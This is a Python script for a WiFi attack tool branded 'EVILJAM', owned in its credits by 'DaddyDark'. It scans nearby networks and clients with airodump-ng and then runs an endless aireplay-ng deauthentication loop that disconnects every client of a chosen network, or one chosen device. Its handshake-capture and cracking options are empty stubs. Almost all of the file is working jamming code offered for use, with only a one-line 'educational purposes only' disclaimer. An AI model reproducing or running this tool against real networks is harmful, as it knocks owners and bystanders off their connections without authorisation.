import os
import time
import subprocess

# Function to get the list of network interfaces
def get_interfaces():
    interfaces = os.popen("ls /sys/class/net/").read().splitlines()
    return interfaces

# Function to display the main menu with enhanced EVILJAM header
def main_menu():
    os.system('clear')

    # Enhanced EVILJAM header in ASCII
    print("\033[1;35m" + "="*50)
    print("\033[1;37m" + " " * 5 + """
    _______    ________        _____    __  ___
   / ____/ |  / /  _/ /       / /   |  /  |/  /
  / __/  | | / // // /   __  / / /| | / /|_/ / 
 / /___  | |/ // // /___/ /_/ / ___ |/ /  / /  
/_____/  |___/___/_____/\____/_/  |_/_/  /_/   
                                               
""" + " " * 5)
    print("="*50 + "\033[0m")

    print("\033[1;32m" + "WELCOME TO THE WiFi JAM TOOL!".center(50) + "\033[0m")

    # Large text for menu options
    print("\033[1;36m" + """
1) WiFi Jam
2) Capture Handshake
3) Activate Monitor Mode
4) Activate Managed Mode
5) Crack Handshake
6) Credits
7) Exit
""" + "\033[0m")  # Cyan color and larger spacing

    choice = input("\033[1;37m" + "Choose an option: " + "\033[0m")

    if choice == "1":
        wiffijam()  # Call the wifi_jam function here
    elif choice == "2":
        capture_handshake()
    elif choice == "3":
        activate_monitor_mode()
    elif choice == "4":
        activate_managed_mode()  # Call the managed mode function
    elif choice == "5":
        crack_handshake()
    elif choice == "6":
        show_credits()
    elif choice == "7":
        print("\033[1;31mExiting tool...\033[0m")
        exit()
    else:
        print("\033[1;33mInvalid choice, try again.\033[0m")  # Yellow color for invalid choice
        time.sleep(20)

# Function for WiFi Jam (Placeholder)
# Function for WiFi Jam

# Colors for the terminal output
class Colors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"

def scan_network(interface, timeout=10):
    """
    Scans for available WiFi networks on the specified interface.
    """
    print(f"{Colors.OKCYAN}Scanning for WiFi networks on {interface}...{Colors.ENDC}")

    try:
        result = subprocess.Popen(
            f"airodump-ng --band abg --output-format csv --write /tmp/scan_results {interface}",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        time.sleep(timeout)  # Run the scan for the given timeout
        
        # Kill the airodump-ng process after the timeout to avoid hanging
        result.terminate() 
        result.wait()

        networks = []
        with open("/tmp/scan_results-01.csv", "r") as file:
            data = file.readlines()

        for line in data[1:]:  # Skip the header line
            parts = line.split(',')
            if len(parts) > 13:  # Check for valid length of the data
                bssid = parts[0].strip()
                channel = parts[3].strip()
                essid = parts[13].strip()
                if bssid and essid and channel.isdigit():
                    # Append network info
                    networks.append((bssid, essid, channel))
        return networks

    except Exception as e:
        print(f"{Colors.FAIL}Error occurred during network scan: {str(e)}{Colors.ENDC}")
        return []
    
    

def scan_clients(interface, bssid, channel, timeout=60):
    """
    Scans for clients connected to the target WiFi network.
    """
    print(f"{Colors.OKCYAN}Scanning clients connected to {bssid}...{Colors.ENDC}")

    try:
        result = subprocess.Popen(
            f"airodump-ng --bssid {bssid} --channel {channel} --output-format csv --write /tmp/client_results {interface}",
            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        time.sleep(timeout)  # Run the scan for the given timeout

        # Kill the airodump-ng process after the timeout
        result.terminate()
        result.wait()

        clients = []
        with open("/tmp/client_results-01.csv", "r") as file:
            data = file.readlines()

        for line in data:
            parts = line.split(',')
            if len(parts) > 0 and "Station MAC" not in parts[0]:  # Avoid header
                mac = parts[0].strip()
                power = parts[3].strip() if len(parts) > 3 else None
                if mac and power and power.lstrip('-').isdigit():
                    # Append client info
                    clients.append((mac, power))
        return clients

    except Exception as e:
        print(f"{Colors.FAIL}Error occurred during client scan: {str(e)}{Colors.ENDC}")
        return []

def switch_channel(interface, channel):
    """
    Switches the wireless interface to the correct channel.
    """
    print(f"{Colors.OKBLUE}Switching {interface} to Channel {channel}...{Colors.ENDC}")
    os.system(f"iw dev {interface} set channel {channel}")  # Switch interface to target channel
    time.sleep(1)  # Give it a second to take effect


def start_deauth_attack(interface, bssid, client_mac=None, channel=None, packets=100000):
    """
    Starts a deauthentication attack on all clients or a specific client connected to the target WiFi network.
    """
    print(f"{Colors.OKGREEN}[Step 3: Starting Deauthentication Attack]{Colors.ENDC}")

    # Switch interface to the correct channel
    print(f"{Colors.OKCYAN}Switching {interface} to channel {channel}...{Colors.ENDC}")
    switch_command = f"iw dev {interface} set channel {channel}"
    switch_process = subprocess.run(switch_command, shell=True, text=True, stderr=subprocess.PIPE)
    
    if switch_process.returncode != 0:
        print(f"{Colors.FAIL}Error setting channel: {switch_process.stderr}{Colors.ENDC}")
        return

    time.sleep(1)  # Allow time for channel change

    try:
        if client_mac:
            # Target a specific client
            print(f"{Colors.OKGREEN}Targeting specific client [{client_mac}] connected to BSSID {bssid}.{Colors.ENDC}")
            attack_command = f"aireplay-ng --deauth {packets} -a {bssid} -c {client_mac} {interface}"
            while True:
                print(f"{Colors.WARNING}ATTACK IS GOING ON CLIENT: [{client_mac}] - CHANNEL: {channel}{Colors.ENDC}")
                subprocess.run(attack_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(1)
        else:
            # Attack all clients connected to the BSSID
            print(f"{Colors.OKGREEN}Targeting all clients connected to BSSID {bssid}.{Colors.ENDC}")
            attack_command = f"aireplay-ng --deauth {packets} -a {bssid} {interface}"
            while True:
                print(f"{Colors.WARNING}ATTACK IS GOING ON ALL CLIENTS CONNECTED TO: [{bssid}] - CHANNEL: {channel}{Colors.ENDC}")
                subprocess.run(attack_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}Attack stopped by user.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}An error occurred: {e}{Colors.ENDC}")


def wiffijam():
    """
    Main function to handle the script's execution flow.
    """
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")
    print(f"{Colors.OKBLUE}Welcome to Evil Jam - The Ultimate WiFi Jammer{Colors.ENDC}")
    print(f"{Colors.HEADER}========================================{Colors.ENDC}")

    # List available network interfaces
    interfaces = os.listdir('/sys/class/net')
    wifi_interfaces = [iface for iface in interfaces if iface.startswith("wlan")]
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(wifi_interfaces, 1):
        print(f"{Colors.OKGREEN}{i}) {iface}{Colors.ENDC}")

    iface_choice = input(f"{Colors.OKCYAN}\nChoose your interface number: {Colors.ENDC}")
    try:
        iface_index = int(iface_choice) - 1
        interface = wifi_interfaces[iface_index]
        print(f"{Colors.OKGREEN}Selected Interface: {interface}{Colors.ENDC}")
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    # Scan for networks
    networks = scan_network(interface)
    if not networks:
        print(f"{Colors.FAIL}No WiFi networks detected. Exiting...{Colors.ENDC}")
        return

    # Remove duplicate entries by converting the list into a set and back to list
    networks = list(set(networks))

    # Display detected networks
    print(f"\n{Colors.OKGREEN}[Scan Complete]{Colors.ENDC}")
    print(f"{Colors.OKCYAN}Detected WiFi Networks:{Colors.ENDC}")
    for i, (bssid, essid, channel) in enumerate(networks, 1):
        print(f"{Colors.OKGREEN}{i}. {essid} (Channel: {channel}, BSSID: {bssid}){Colors.ENDC}")

    network_choice = input(f"{Colors.OKCYAN}\nChoose a WiFi network to target (Enter number or 'X' to exit): {Colors.ENDC}")
    if network_choice.upper() == 'X':
        print(f"{Colors.FAIL}Exiting...{Colors.ENDC}")
        return

    try:
        network_index = int(network_choice) - 1
        bssid, essid, channel = networks[network_index]
        print(f"{Colors.OKGREEN}Target WiFi Network: {essid} (BSSID: {bssid}, Channel: {channel}){Colors.ENDC}")
    except (IndexError, ValueError):
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return

    # Select attack mode
    print(f"\n{Colors.OKBLUE}[Step 2: Choose Attack Mode]{Colors.ENDC}")
    print(f"{Colors.OKCYAN}1. Jam all clients{Colors.ENDC}")
    print(f"{Colors.OKCYAN}2. Jam a specific client{Colors.ENDC}")
    attack_choice = input(f"{Colors.OKCYAN}\nEnter your choice (1 or 2): {Colors.ENDC}")

    if attack_choice == "1":
        print(f"{Colors.OKGREEN}Starting deauthentication attack on all clients connected to {essid}...{Colors.ENDC}")
        start_deauth_attack(interface, bssid, channel=channel)  # Attack all clients
    elif attack_choice == "2":
        # Scan for clients
        clients = scan_clients(interface, bssid, channel)
        if not clients:
            print(f"{Colors.FAIL}No clients detected. Exiting...{Colors.ENDC}")
            return

        # Remove duplicate entries by converting the list into a set and back to list
        clients = list(set(clients))

        # Display detected clients
        print(f"\n{Colors.OKCYAN}Detected Clients:{Colors.ENDC}")
        for i, (mac, power) in enumerate(clients, 1):
            print(f"{Colors.OKGREEN}{i}. MAC: {mac}, Power: {power}{Colors.ENDC}")

        client_choice = input(f"{Colors.OKCYAN}\nChoose a client to jam (Enter number): {Colors.ENDC}")
        try:
            client_index = int(client_choice) - 1
            client_mac, client_power = clients[client_index]
            start_deauth_attack(interface, bssid, client_mac, channel)  # Attack specific client
        except (IndexError, ValueError):
            print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
            return
    else:
        print(f"{Colors.FAIL}Invalid choice. Exiting...{Colors.ENDC}")
        return



    

# Function to scan for avail
# Function to capture handshake (as before)
def capture_handshake():
    os.system('clear')
    print("\033[1;32m" + "="*50)
    print("Capturing Handshake...".center(50))
    print("="*50 + "\033[0m")
    # Rest of the logic

# Function to activate monitor mode with the provided logic
def activate_monitor_mode():
    os.system('clear')
    
    # Get available network interfaces
    interfaces = get_interfaces()
    print("\nAvailable interfaces:")
    
    # Show interfaces and allow user to choose one
    for i, iface in enumerate(interfaces):
        print(f"{i + 1}) {iface}")
    
    # Ask user to choose the interface to activate monitor mode
    choice = int(input("Choose your interface number: "))
    interface = interfaces[choice - 1]
    print(f"Activating monitor mode on {interface}...")

    # Run the commands to activate monitor mode
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")
    print(f"Monitor mode activated on {interface}.")

    time.sleep(2)
    main_menu()

# Function to activate managed mode (added)
def activate_managed_mode():
    os.system('clear')
    
    # Get available network interfaces
    interfaces = get_interfaces()
    print("\nAvailable interfaces:")
    
    # Show interfaces and allow user to choose one
    for i, iface in enumerate(interfaces):
        print(f"{i + 1}) {iface}")
    
    # Ask user to choose the interface to activate managed mode
    choice = int(input("Choose your interface number: "))
    interface = interfaces[choice - 1]
    print(f"Deactivating monitor mode and switching to managed mode on {interface}...")
    
    # Run the commands to deactivate monitor mode and activate managed mode
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type managed")  # Switching to managed mode
    os.system(f"sudo ip link set {interface} up")
    print(f"Managed mode activated on {interface}.")

    time.sleep(2)
    main_menu()

# Function to crack handshake (as before)
def crack_handshake():
    os.system('clear')
    print("\033[1;32m" + "="*50)
    print("Cracking Handshake...".center(50))
    print("="*50 + "\033[0m")
    # Rest of the logic

# Function to show credits (as before)
def show_credits():
    print("\n" + "-"*50)
    print("\033[1;36m" + "                      CREDITS                       ".center(50) + "\033[0m")
    print("-"*50)
    print("\033[1;35mTool owned by: DaddyDark".ljust(50) + "\033[0m")
    print("\033[1;33mSpecial thanks to all contributors.".ljust(50) + "\033[0m")
    print("\n\033[1;32mCopyright 2025 - All Rights Reserved.\033[0m")
    print("\033[1;31mThis tool is provided for educational purposes only.\033[0m")
    print("\033[1;31mUnauthorized use may violate laws in your jurisdiction.\033[0m")
    print("-"*50)
    time.sleep(20)
    main_menu()

# Start the main menu when the script is executed
if __name__ == "__main__":
    main_menu()
